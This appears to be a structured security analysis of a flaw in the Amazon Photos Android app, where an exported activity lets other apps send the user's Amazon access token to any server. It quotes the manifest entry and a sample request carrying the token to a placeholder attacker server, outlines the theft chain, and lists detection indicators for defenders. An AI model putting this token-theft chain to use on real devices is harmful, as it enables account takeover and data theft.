package_info.package_versions: Prior to Dec 18, 2021 (exact versions not specified, but all before the fix)
package_info.why_malicious: The app's misconfigured exported activity allowed any other app on the device to trigger an HTTP request containing the user's Amazon access token to an attacker-controlled server, enabling full compromise of Amazon account data and files.

execution_context.trigger: runtime (when activity is launched via intent)

malicious_snippets.code_snippet:
<activity
  android:label="@ref/0x7f1300ee"
  android:name="com.amazon.gallery.thor.app.activity.ThorViewActivity"
  android:configChanges="0x4a0">
  ...
  <intent-filter>
    <action android:name="android.intent.action.VIEW"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <category android:name="android.intent.category.BROWSABLE"/>
    <data android:scheme="http"/>
    <data android:scheme="https"/>
    <data android:scheme="content"/>
    <data android:scheme="file"/>
    <data android:mimeType="video/*"/>
    <data android:mimeType="application/sdp"/>
    <data android:mimeType="application/vnd.apple.mpegurl"/>
    <data android:mimeType="application/x-mpegurl"/>
  </intent-filter>
  ...
</activity>
malicious_snippets.code_behavior: At runtime, the activity is exported and can be triggered by any app via an intent, causing the app to process attacker-supplied URLs and initiate HTTP requests containing sensitive headers.

malice_analysis.why_suspicious: Exported activities should not be accessible to untrusted apps unless absolutely necessary, especially when they can trigger sensitive operations.
malice_analysis.violated_expectations: Normal behavior is to restrict sensitive activities to internal use only; here, the activity is open to all apps.
malice_analysis.similar_legitimate_use: Exported activities are sometimes used for sharing data between trusted apps, but not for sensitive operations.
key_indicators: activity exported with VIEW action and BROWSABLE category

execution_context.trigger: runtime (when ThorViewActivity is triggered with a crafted intent)
execution_context.file_location: App runtime (triggered by intent, not directly visible in code)

malicious_snippets.code_behavior: At runtime, a malicious app (or attacker with adb) sends an intent to ThorViewActivity with a malicious URL, causing the app to make an HTTP request to the attacker's server.

malice_analysis.why_suspicious: Allows untrusted apps to trigger sensitive network requests on behalf of the victim, potentially leaking authentication tokens.
malice_analysis.violated_expectations: Normal behavior is to restrict such intents to trusted sources or validate the destination.
malice_analysis.similar_legitimate_use: Testing or debugging with adb, but not in production or from untrusted apps.
key_indicators: intent can be sent by any app

execution_context.trigger: runtime (when HTTP request is made to attacker server)
execution_context.file_location: HTTP request generated by app (not directly visible in code, but observable in network traffic)

malicious_snippets.code_snippet:
GET /poc.mp4 HTTP/1.1
x-amz-access-token: <user's Amazon access token>
User-Agent: PhotosAndroid/1.46.0-80254410g (Linux;Android 11) ExoPlayerLib/2.9.0
Accept-Encoding: identity
Host: <attacker's server>
Connection: Keep-Alive
malicious_snippets.code_behavior: At runtime, the app sends an HTTP request to the attacker-controlled server, including the user's Amazon access token in the x-amz-access-token header.

malice_analysis.why_suspicious: Sensitive authentication tokens should never be sent to untrusted or user-controlled destinations.
malice_analysis.violated_expectations: Normal behavior is to only send tokens to trusted Amazon endpoints.
malice_analysis.similar_legitimate_use: Legitimate requests to Amazon APIs, but never to arbitrary domains.
key_indicators: access token sent in HTTP header

execution_context.file_location: External (attacker's system, using curl or similar tools)

malicious_snippets.code_behavior: After exfiltration, the attacker uses the stolen token to access, modify, or delete the victim's files via Amazon Drive API.

malice_analysis.why_suspicious: Use of stolen tokens to access victim's cloud data is a clear sign of account compromise.
malice_analysis.violated_expectations: Only the legitimate user or trusted apps should access these APIs with valid tokens.
malice_analysis.similar_legitimate_use: Legitimate API access by the user, but not by an attacker.
key_indicators: API access from unusual IPs or locations
bulk file operations after token exfiltration

attack_chain.action: Malicious app or attacker sends crafted intent to exported ThorViewActivity with attacker-controlled URL.
attack_chain.leads_to: App makes HTTP request to attacker server with access token.

attack_chain.action: App sends HTTP request to attacker-controlled server, leaking Amazon access token in header.
Attacker uses stolen token to access, modify, or delete victim's Amazon Drive files and personal data via Amazon APIs.
attack_chain.leads_to: Full compromise of victim's Amazon account and data.

behavioral_signatures: Exported Android activities with VIEW/BROWSABLE intent-filters accepting http/https/file/content schemes
Sensitive tokens (e.g., x-amz-access-token) sent to non-Amazon domains
Unusual or bulk API access following app activity
file_indicators: AndroidManifest.xml: exported activities with broad intent-filters
App code that constructs HTTP requests with sensitive headers to arbitrary URLs
network_indicators: HTTP requests from app to non-Amazon domains containing x-amz-access-token header
API calls to Amazon Drive from unusual IPs or after token exfiltration
detection_knowledge.how_to_detect: Monitor AndroidManifest.xml for exported activities with broad intent-filters. Inspect app network traffic for sensitive tokens sent to non-whitelisted domains. Alert on Amazon API access from IPs or devices not associated with the legitimate user, especially after suspicious app activity.
